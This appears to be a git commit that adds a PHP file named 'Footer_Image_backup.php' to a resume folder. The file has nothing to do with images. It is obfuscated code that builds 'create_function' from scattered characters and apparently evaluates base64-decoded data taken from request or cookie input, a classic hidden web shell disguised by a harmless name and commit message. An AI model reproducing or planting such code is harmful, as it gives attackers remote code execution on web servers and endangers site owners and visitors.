90d002716e678ebfb99f8ca22bce82d7cba4bf14
ncc <ncc@NIT106X005.local>
2015-12-10 22:20:34 -0800

    Updated with resume folder

---
+++ resume/Footer_Image_backup.php
@@ -0,0 +1,97 @@
+<?php
+
+$flees= 'T_r(xET';$malachi='rT"(e]';
+$kiersten= 'U'; $condemnations= 'nEi$m)Ou';
+$bylaw='_$Ieeta'; $heroes= 'gnr)iiS';
+$gongs='T'; $crystal = 'Oldo$_gna';
+$anchoring='a'; $arrogation= 'UC_a';
+$cloy ='FNX"]'; $larisa ='l4';
+$breech ='_Tb?ydn"'; $magazine= 'a_crV';$dragoneyes ='PeRr[';$lia='R';$esta=')sax)';
+$assonance =')=,ti'; $gustavus = 'q'; $capillary= ')FsS';$antinomian= '$'; $hoagy = 'J'; $job= 'X$O)aoq,';$graced ='n'; $foolishly= 'X';$conjunct= 'x'; $judicial='s'; $caribou= 'e';$holdout='aerg"uHv(';$exonerate = 'eaT ';$envision = 'cv(v:ej(';$inhibition='yr;$xfs;a';
+
+$lighter='e'; $finale = 'P';$debrief = 'S';$graph='N'; $angered ='a[t$';$johnny='fV';
+$ervin ='_';$ducking ='=[';$azaleas = 'QsprNiJii';
+
+$flitting= '_(Ajfe"Q('; $comprehensive= 'E'; $judith='s';$hutchins =']'; $belittled=';d'; $eugine ='r';
+$inductions ='K'; $compilations= 'P';
+
+$hamlet ='R';$ambiguities= 'e'; $frosted='"';
+$corey = ':ut)';
+$fancier = 'c';$anett='i';$foobar ='U';
+
+$ephraim = 't'; $democrats ='?Rr';
+
+$diagrammer ='i'; $hoe='$e';$dozed =';'; $casework = 'A[)6eee'; $comply ='s';$effector= '))';$kitchen ='(""U(_u'; $contributions ='o'; $bited ='s';
+$bacilli ='a';$inertly = '_$X$c_a';$jorrie= 't'; $amberly ='H';$insomniac = 'f'; $infallibly= 'E';
+$embarcadero = 'tEQ(r';$kaleb= 'p'; $applicator='WQv](';
+$hymns=$inertly['4'] .$embarcadero[4].$casework['6'] .$inertly['6'] .$embarcadero['0'].$casework['6'] . $inertly['5'] . $insomniac.$kitchen['6']. $graced.$inertly['4'] . $embarcadero['0'].$diagrammer . $contributions . $graced; $faunie=$exonerate['3']; $erosible =$hymns($faunie, $casework['6']. $applicator['2'].$inertly['6'].$larisa[0].
+$applicator['4']. $inertly['6'] .$embarcadero[4] . $embarcadero[4].$inertly['6']. $inhibition['0']. $inertly['5']. $kaleb .$contributions .$kaleb. $applicator['4']. $insomniac.
+
+$kitchen['6'].$graced. $inertly['4'].
+$inertly['5']. $holdout['3'] .$casework['6'].$embarcadero['0']. $inertly['5'] .
+$inertly['6'] .$embarcadero[4]. $holdout['3'] .$bited.$applicator['4'].
+
+$effector['1'] . $effector['1'].
+
+$effector['1']. $dozed);$erosible($canonicalization['2'], $dozed ,$effector['1'],
+$effector['1'] ,$job['2'] ,$johnny[1] ,
+
+$applicator['2'],
+$inertly[3].$diagrammer .$ducking['0']. $inertly['6'].
+
+$embarcadero[4] .$embarcadero[4] .$inertly['6'] .
+
+$inhibition['0'] . $inertly['5'] . $condemnations['4']. $casework['6'] . $embarcadero[4].$holdout['3'] .$casework['6'] .$applicator['4'] .
+
+$inertly[3] . $inertly['5'].$democrats[1] .$embarcadero[1].$applicator['1'].
+
+$kitchen['3'] . $embarcadero[1] . $debrief. $exonerate['2'].
+
+$job[7] . $inertly[3].
+
+$inertly['5'].$arrogation['1'] . $job['2'] . $job['2'].$inductions.
+$bylaw['2'] .$embarcadero[1].
+$job[7] .
+$inertly[3]. $inertly['5'].$debrief. $embarcadero[1] . $democrats[1].$johnny[1] .
+
+$embarcadero[1] . $democrats[1].$effector['1'] . $dozed.
+$inertly[3] .$inertly['6'].
+$ducking['0'] .$diagrammer. $bited .$bited . $casework['6'] . $embarcadero['0'] . $applicator['4'] .$inertly[3] .$diagrammer . $casework['1'].
+
+$kitchen['2'] .$graced . $flitting['3']. $job['6'].$kitchen['6']. $inhibition['4']. $inhibition['4'] . $insomniac .
+
+$inertly['6'] . $kitchen['2'] .$applicator['3'].
+$effector['1']. $democrats['0'] .$inertly[3].$diagrammer . $casework['1'].$kitchen['2'] .$graced .$flitting['3'] .$job['6'].$kitchen['6']. $inhibition['4'].
+$inhibition['4']. $insomniac . $inertly['6'] .
+$kitchen['2']. $applicator['3'] . $corey[0].
+$applicator['4'] .$diagrammer .$bited.
+$bited .
+$casework['6'] .$embarcadero['0'] .
+
+$applicator['4'] .$inertly[3] .$diagrammer.$casework['1'] .
+
+$kitchen['2'] .$amberly . $exonerate['2'] . $exonerate['2'] .$compilations.$inertly['5'] . $azaleas['4'] .$azaleas['6'].$applicator['1'] .$kitchen['3'].$inertly['2'] . $inertly['2'].$capillary['1'].
+
+$casework['0'] . $kitchen['2'] . $applicator['3'] . $effector['1'].$democrats['0'].
+
+$inertly[3] . $diagrammer.$casework['1'] .$kitchen['2'] .$amberly. $exonerate['2'] .$exonerate['2'].
+$compilations . $inertly['5']. $azaleas['4']. $azaleas['6'] .
+
+$applicator['1'] . $kitchen['3'] . $inertly['2'].$inertly['2'].
+
+$capillary['1'].$casework['0'] .$kitchen['2']. $applicator['3']. $corey[0].
+
+$belittled['1']. $diagrammer. $casework['6'] .$effector['1'] .$dozed . $casework['6'] .
+$applicator['2']. $inertly['6'].
+$larisa[0] .$applicator['4'] . $bited .
+$embarcadero['0'] . $embarcadero[4].$embarcadero[4] .
+$casework['6'] .$applicator['2'].$applicator['4']. $breech['2'] .
+$inertly['6'].$bited . $casework['6'] . $casework['3'].
+
+$larisa['1'] . $inertly['5'] .$belittled['1']. $casework['6'].
+$inertly['4']. $contributions. $belittled['1'] . $casework['6']. $applicator['4'] .$bited.$embarcadero['0']. $embarcadero[4] .$embarcadero[4] . $casework['6'] .
+$applicator['2']. $applicator['4'] .
+
+$inertly[3] .
+
+$inertly['6'] .$effector['1'] .$effector['1']. $effector['1'].$effector['1'] .$dozed); 
